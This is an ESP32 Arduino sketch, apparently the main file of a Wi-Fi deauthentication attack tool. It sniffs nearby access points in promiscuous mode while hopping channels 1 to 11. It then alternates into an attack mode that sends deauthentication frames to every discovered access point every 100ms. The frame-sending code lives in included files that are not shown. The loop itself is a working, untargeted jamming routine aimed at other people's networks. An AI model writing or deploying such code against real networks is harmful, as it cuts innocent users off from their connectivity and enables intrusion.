#include "SPI.h"
#include <Arduino.h>
#include "freertos/FreeRTOS.h"
#include "driver/gpio.h"
#include "esp_wifi.h"
#include "esp_system.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "inttypes.h"

#include "serialUtil.h"
#include "sniffing.h"
#include "deauthentication.h"

// Discovery mode hopping interval in ms.
// As probe requests are generally sent every 100ms, 200ms should be enough.
#define DISCOVERY_HOPPING_INTERVAL 200

// Attack mode hopping interval in ms.
// Should be more than discovery mode, as ESP needs between sending two frames.
#define ATTACK_HOPPING_INTERVAL 1000

// Time between sending two deauthentication frames, in ms.
#define DEAUTHENTICATION_RECOVERY_TIME 100

std::map<String, wifi_AP*> discoveredWifiAPs;

uint8_t channel = 1;
uint8_t max_channel = 11;
int16_t hoppingInterval = DISCOVERY_HOPPING_INTERVAL;
unsigned long lastHopTime = 0;
boolean activate_hopping = true;

bool attackMode = false;

void setup() {
  Serial.begin(921600);
  delay(2000);
  setupPCAP();

  nvs_flash_init();

  // ESP Wifi intialization.
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
  ESP_ERROR_CHECK(esp_wifi_start());
    
  // Set wifi to promiscuous mode and callback function to promiscuousModeCallBack.
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(promiscuousModeCallBack);

  // Set primary and secondary channel (not used).
  wifi_second_chan_t secondchannel = (wifi_second_chan_t)NULL;
  esp_wifi_set_channel(channel,secondchannel);
}


void loop() {
  if (attackMode) {
    for (auto it = discoveredWifiAPs.begin(); it != discoveredWifiAPs.end(); ++it) {
      if(it->second->channel == channel) {
        deauthenticateTarget(it->second);
        usleep(DEAUTHENTICATION_RECOVERY_TIME * 1000);
      }
    }
  }
  
  if(activate_hopping){
    unsigned long currentTime = millis();
    if(currentTime - lastHopTime >= hoppingInterval) {
      lastHopTime = currentTime;
      channel++;
      if(channel > max_channel) {
        channel = 1;
        attackMode = !attackMode; // cycles between attack and discovery
        hoppingInterval = attackMode ? ATTACK_HOPPING_INTERVAL : DISCOVERY_HOPPING_INTERVAL;
      }
      wifi_second_chan_t secondchannel = (wifi_second_chan_t)NULL;
      esp_wifi_set_channel(channel,secondchannel);
    }
  }
}
